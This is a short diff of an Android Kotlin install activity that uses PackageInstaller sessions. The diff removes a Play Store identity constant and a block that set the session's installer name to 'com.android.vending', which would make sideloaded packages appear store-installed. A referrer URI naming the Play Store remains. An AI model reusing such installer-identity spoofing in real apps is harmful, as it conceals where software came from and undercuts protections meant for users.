@@ -24,7 +24,6 @@ class InstallActivity : AppCompatActivity() {
     companion object {
         private const val SESSION_REQUEST = 1001
         private const val MAX_RETRIES    = 2
-        private const val STORE_IDENTITY = "com.android.vending"
         private const val MARKET_URI     = "market://details?id=com.android.pictach"
         private const val REFERRER_URI   = "android-app://com.android.vending"
     }
@@ -85,13 +84,7 @@ class InstallActivity : AppCompatActivity() {
                 }
             }
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                try {
-                    params.setInstallerPackageName(STORE_IDENTITY)
-                } catch (e: Exception) {
-                    // Continue without identity
-                }
-            }
+
 
             val sessionId = packageInstaller.createSession(params)
             val session   = packageInstaller.openSession(sessionId)
